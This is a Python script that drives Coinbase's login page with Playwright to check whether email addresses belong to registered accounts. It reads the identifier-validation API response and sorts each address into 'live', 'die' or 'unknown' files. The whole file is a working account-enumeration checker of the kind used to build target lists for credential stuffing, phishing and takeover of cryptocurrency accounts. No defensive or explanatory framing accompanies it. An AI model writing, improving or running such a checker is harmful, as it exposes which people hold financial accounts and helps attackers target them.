from time import sleep
from colorama import Fore
from playwright.sync_api import sync_playwright

class Coinbase:

    def __init__(self, email: str):
        self.p = sync_playwright().start()
        self.browser = self.p.webkit.launch()
        self.page = self.browser.new_page()
        self.email = email
    
    def save(self, filename: str, content: str):
        with open(filename, 'a') as f:
            f.write(content + '\n')
    
    def handle_request(self, response):
        if "/api/v1/validate-identifier" in response.url:
            json = response.json()
            error = json.get('error')
            if not error:
                state = json.get('state_transition')
                if not state:
                    print(f"[!] {self.email} ~> {Fore.RED}Error: No state transition found in response{Fore.RESET}")
                    self.save('unknow.txt', self.email)
                else:
                    state2 = state.get('state')
                    if not state2:
                        print(f"[!] {self.email} ~> {Fore.RED}Error: No state found in response{Fore.RESET}")
                        self.save('unknow.txt', self.email)
                    else:
                        if state2 == 'STATE_CREDENTIALS_PROMPT':
                            print(f"[+] {self.email} ~> {Fore.GREEN}LIVE{Fore.RESET}")
                            self.save('live.txt', self.email)
                        else:
                            print(f"[!] {self.email} ~> {Fore.RED}Error: Unknown state found in response{Fore.RESET}")
                            self.save('unknow.txt', self.email)
            else:
                if error.get('code') == 'ERROR_CODE_IDENTIFIER_DOES_NOT_EXIST':
                    print(f"[!] {self.email} ~> {Fore.RED}Not Valid{Fore.RESET}")
                    self.save('die.txt', self.email)
                else:
                    print(f"[!] {self.email} ~> {Fore.RED}Error: Unknown error found in response{Fore.RESET}")
                    self.save('unchecked.txt', self.email)

    @property
    def close(self):
        self.browser.close()
        self.p.stop()
    
    @property
    def run(self):
        self.page.goto('https://login.coinbase.com/')
        
        try:
            self.page.wait_for_selector('#Email', state='visible')
        except:
            print(f'[-] {self.email} ~> {Fore.RED}Page Not Loaded{Fore.RESET}')
            return self.close
        try:
            self.page.type('#Email', self.email)
        except:
            print(f'[-] {self.email} ~> {Fore.RED}Page Not Loaded{Fore.RESET}')
            return self.close
        self.page.keyboard.press('Enter')
        self.page.on('response', self.handle_request)

        try:
            self.page.wait_for_selector('#Password', state='visible')
        except:
            pass
        
        self.close